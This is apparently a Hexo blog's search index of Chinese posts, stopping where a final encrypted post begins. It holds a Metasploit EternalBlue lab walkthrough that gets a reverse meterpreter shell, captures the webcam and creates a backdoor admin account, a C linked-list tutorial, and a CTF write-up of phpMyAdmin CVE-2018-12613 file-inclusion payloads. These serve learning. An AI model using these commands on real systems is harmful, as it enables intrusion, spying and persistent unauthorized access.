<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MSF-永恒之蓝入侵</title>
    <url>/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/</url>
    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
<h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p>渗透机kali      ip:192.168.119.138</p>
<p>靶机 win7-2    ip:192.168.119.132</p>
<p>子网掩码：255.255.255.0</p>
<a id="more"></a>

<h3 id="测试能否ping通"><a href="#测试能否ping通" class="headerlink" title="测试能否ping通"></a>测试能否ping通</h3><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193858120.png" alt="image-20200926193858120">

<p>​       </p>
<img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193926874.png" alt="image-20200926193926874">

<p>ok 可以</p>
<hr>
<ul>
<li>kali打开 msfconsole</li>
</ul>
<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926194608129.png" alt="image-20200926194608129"></p>
<ul>
<li>输入search ms17_010</li>
</ul>
<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926195212894.png" alt="image-20200926195212894"></p>
<p><code>auxiliary/scanner/smb/smb_ms17_010</code>             为扫描模板</p>
<p><code>exploit/windows/smb/ms17_010_eternalblue</code>为攻击模板</p>
<h3 id="扫描是否存在该漏洞"><a href="#扫描是否存在该漏洞" class="headerlink" title="扫描是否存在该漏洞"></a>扫描是否存在该漏洞</h3><blockquote>
<p>ues <code>auxiliary/scanner/smb/smb_ms17_010</code>    #使用模块</p>
<p>optipons                                                                         #查看我们需要的设置</p>
<p>set rhosts   192.168.119.1-137                                       #设置目标ip范围</p>
<p>set threads     20                                                             #设置线程，加快扫描</p>
<p>run</p>
</blockquote>
<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926201345760.png" alt="image-20200926201345760"></p>
<p>我们可以发现存在漏洞的地方</p>
<hr>
<h3 id="运用攻击模块"><a href="#运用攻击模块" class="headerlink" title="运用攻击模块"></a>运用攻击模块</h3><blockquote>
<p>use   <code>exploit/windows/smb/ms17_010_eternalblue</code></p>
<p>set rhosts  192.168.119.132</p>
<p>set payload windows/x64/meterpreter/reverse_tcp</p>
<p>set lhost 192.168.119.138</p>
<p>exploit</p>
</blockquote>
<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205215563.png" alt="image-20200926205215563"></p>
<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205307084.png" alt="image-20200926205307084"></p>
<p>成功监听了。</p>
<hr>
<h3 id="干点坏事了-嘿嘿"><a href="#干点坏事了-嘿嘿" class="headerlink" title="干点坏事了~_ ~嘿嘿"></a>干点坏事了~_ ~嘿嘿</h3><blockquote>
<p>sysinfo   显示远程主机系统信息</p>
<p>getuid    查看用户身份</p>
<p>screenshot  对远程主机当前屏幕进行截图</p>
</blockquote>
<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926210803367.png" alt="image-20200926210803367"></p>
<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926211000376.png" alt="image-20200926211000376"></p>
<blockquote>
<p>webcam_list 查看有没有摄像头  ,webcam_stream 打开摄像头。虚拟机一般情况下没有摄像头，除非自己设置</p>
<p>webcam_snap 拍照</p>
</blockquote>
<blockquote>
<p>shell  进入控制台    如果出现中文乱码  : chcp 65001解决shell后中文乱码问题</p>
<p>后面删文件（del   ），写文件(echo  内容&gt; 1.txt)都可以 //dos 命令</p>
</blockquote>
<hr>
<h3 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h3><blockquote>
<p>net user shmily-ing 111111 /add  创建shmily-ing用户</p>
<p> net localgroup administrators shmily-ing /add   提权</p>
</blockquote>
<hr>
<p><a href="https://blog.csdn.net/qq_27446553/article/details/73480807?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase"><strong>EternalBlue-分析</strong></a></p>
<p><a href="https://blog.csdn.net/wwl012345/article/details/89421881">参考博客</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title>链表-c语言</title>
    <url>/2022/06/13/2020.9.16%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
<p>下面主要是运用C去实现链表的头插法，尾插法实现有序插入，以及中间插入一个数。</p>
<a id="more"></a>

<h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;// 头插法</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">list</span> *p;</span><br><span class="line">	head=<span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	input();</span><br><span class="line">	<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123; <span class="comment">//输出头插法链表数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		s=(<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">		s-&gt;data=i;</span><br><span class="line">		s-&gt;next = head;  <span class="comment">//第一个数据地址为空，下一个指向前一个s；</span></span><br><span class="line">		head = s;          <span class="comment">//作为新头部；</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="尾插法的有序插入"><a href="#尾插法的有序插入" class="headerlink" title="尾插法的有序插入"></a>尾插法的有序插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">         <span class="keyword">char</span> data;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linklist;</span><br><span class="line">  linklist *head,*tail;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   linklist *p;</span><br><span class="line">   head=tail=<span class="literal">NULL</span>;</span><br><span class="line">   input();</span><br><span class="line">   <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,p-&gt;data);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> ch;</span><br><span class="line">   linklist *t;</span><br><span class="line">   ch=getchar();</span><br><span class="line">   <span class="keyword">while</span>(ch!=&amp;apos;@&amp;apos;)&#123;</span><br><span class="line">       t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">       t-&gt;data=ch;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">       head=t;</span><br><span class="line">       t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       tail-&gt;next=t;</span><br><span class="line">&#125;</span><br><span class="line">   tail=t;</span><br><span class="line">   tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">   ch=getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="插入有序链表一个数"><a href="#插入有序链表一个数" class="headerlink" title="插入有序链表一个数"></a>插入有序链表一个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;     //实现简单的有序链表插入 </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*tail;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *p; </span><br><span class="line">	head=tail=<span class="literal">NULL</span>;</span><br><span class="line">	input_inset();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;     </span><br><span class="line">	</span><br><span class="line">	          <span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);         </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,num;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *t,*T,*pp;</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		t-&gt;data = i;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;  </span><br><span class="line">	</span><br><span class="line">		    head = t;     </span><br><span class="line">		    t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> tail-&gt;next=t;</span><br><span class="line">	</span><br><span class="line">	tail = t;   </span><br><span class="line">	</span><br><span class="line">	tail-&gt;next=<span class="literal">NULL</span>;  </span><br><span class="line">	</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入操作 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入插入点的前一个数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(pp=head;pp!=<span class="literal">NULL</span>;pp= pp-&gt;next)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(pp-&gt;data==num)&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">			T = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T-&gt;data);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			T-&gt;next=pp-&gt;next;</span><br><span class="line">			</span><br><span class="line">			pp-&gt;next = T;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输出插入后的链表\n&quot;</span>);	</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>多谢刘**的指导（内心抗拒）</p>
<p>可能写的不是很完美，感谢大佬的访问~~ORZ</p>
]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>算法与数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU- [GWCTF 2019]</title>
    <url>/2022/06/13/2020-9-27buuctf/</url>
    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
<blockquote>
<p>phpmyadmin (CVE-2018-12613)任意文件包含漏洞。影响版本4.8.0–4.8.1</p>
<a id="more"></a>
</blockquote>
<h3 id="打开网页，神马也不是。"><a href="#打开网页，神马也不是。" class="headerlink" title="打开网页，神马也不是。"></a>打开网页，神马也不是。</h3><p><img src="/2022/06/13/2020-9-27buuctf/image-20200925180115693.png" alt="image-20200925180115693"></p>
<h3 id="F12没有信息，直接扫网站后台"><a href="#F12没有信息，直接扫网站后台" class="headerlink" title="F12没有信息，直接扫网站后台"></a>F12没有信息，直接扫网站后台</h3><blockquote>
<p>python dirsearch.py -u <a href="http://10b9238b-d123-4f63-891c-33ce01e55ca1.node3.buuoj.cn/">http://10b9238b-d123-4f63-891c-33ce01e55ca1.node3.buuoj.cn/</a> -e *  -s  0.05</p>
</blockquote>
<p> 刚开始没有扫出来，全是429，可能太快了，  就在后面加了个 -s  延迟一下</p>
<p><img src="/2022/06/13/2020-9-27buuctf/image-20200925230015691.png" alt="image-20200925230015691"></p>
<p>发现phpmyadmin ,phpinfo.php(没信息)</p>
<p>直接进入数据库。查看版本4.8.1</p>
<p>然后就百度该版本漏洞，发现有 任意文件包含和任意代码执行漏洞</p>
<p><a href="https://xz.aliyun.com/t/6592">CVE-2018-12613 phpMyAdmin远程文件包含漏洞</a></p>
<p>传入<code>?target=db_datadict.php%253f</code>，<code>%253f</code>开始服务器自动解码一次为<code>%3f</code>，然后<code>urldecode</code>函数再解码一次为<code>?</code>，则满足截取?之前的内容在白名单中，返回<code>true</code>。而在<code>index.php</code>中只解码一次为<code>db_datadict.php%3f</code></p>
<h3 id="目录穿越，任意文件包含pyload："><a href="#目录穿越，任意文件包含pyload：" class="headerlink" title="目录穿越，任意文件包含pyload："></a>目录穿越，任意文件包含pyload：</h3><blockquote>
<p>?target=db_sql.php%253f/../../../../../../../../flag</p>
</blockquote>
<p><img src="/2022/06/13/2020-9-27buuctf/image-20200926122420288.png" alt="image-20200926122420288"></p>
<ul>
<li>session 进行 php 代码执行（session 文件中中记录了执行的操作）</li>
</ul>
<p>​        具体方法：SELECT ‘ <code>&lt;?php phpinfo()?&gt;</code> ‘ ;</p>
<p><img src="/2022/06/13/2020-9-27buuctf/image-20200926120643739.png" alt="image-20200926120643739"></p>
<p>然后查看session值,</p>
<blockquote>
<p>?target=db_sql.php%253f/../../../../../../../../tmp/sess_fal9idhffq4t112qfa86k5kbo1</p>
</blockquote>
<p>可以搜索flag。(没成功)</p>
<ul>
<li>网上说写入后门（本题好像不太行，因为没有写入权限），本地搭建的话可以实现。</li>
</ul>
<p><img src="/2022/06/13/2020-9-27buuctf/image-20200926122045439.png" alt="image-20200926122045439"></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">后台gertshell</a></p>
<p><a href="https://www.cnblogs.com/wangyuyang1016/p/12014016.html">参考博客</a></p>
<hr>
<h3 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p>​            target 出事了,   满足if判断    即可促发include</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    ! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;target&#x27;</span>])  <span class="comment">//不为空</span></span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;target&#x27;</span>])   <span class="comment">//是字符串</span></span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, $_REQUEST[<span class="string">&#x27;target&#x27;</span>])  <span class="comment">//不以index开头</span></span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">&#x27;target&#x27;</span>], $target_blacklist)  <span class="comment">//不在$target_blacklist中</span></span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">&#x27;target&#x27;</span>])  <span class="comment">//要返回真</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​           $target_blacklist，target参数黑名单  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;$page, <span class="keyword">array</span> $whitelist = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">            $whitelist = <span class="built_in">self</span>::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);    <span class="comment">//解码，</span></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>$whitelist一开始未传参过来，所以会被赋值为self::$goto_whitelist</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> $goto_whitelist = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>如果$page在白名单中就会直接return true，但这里考虑到了可能带参数的情况</p>
<blockquote>
<p>  <strong>mb_substr</strong>    ( string <code>$str</code>   , int <code>$start</code>   [, int <code>$length</code> = NULL   [, string <code>$encoding</code> = mb_internal_encoding()  ]] ) : string</p>
</blockquote>
<p>   根据字符数执行一个多字节安全的 <a href="https://www.php.net/manual/zh/function.substr.php">substr()</a> 操作。   位置是从 <code>str</code> 的开始位置进行计数。   第一个字符的位置是 0。第二个字符的位置是 1，以此类推。   </p>
<p>$_page是取出$page问号前的东西，是考虑到target有参数的情况，只要$_page在白名单中就直接return true<br> 但还考虑了url编码的情况，所以如果这步判断未成功，下一步又进行url解码.</p>
<p>所以传入二次编码后的内容，会让checkPageValidity()这个函数返回true，但index中实际包含的内容却不是白名单中的文件</p>
<p>例如传入<br> <code>?target=db_datadict.php%253f</code><br> 由于服务器会自动解码一次，所以在checkPageValidity()中，$page的值一开始会是<code>db_datadict.php%3f</code>，又一次url解码后变成了<code>db_datadict.php?</code>，这次便符合了?前内容在白名单的要求，函数返回true<br> 但在index.php中$_REQUEST[‘target’]仍然是<code>db_datadict.php%3f</code>，而且会被include，通过目录穿越，就可造成任意文件包含</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>2020总结</title>
    <url>/2021/02/06/2020%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
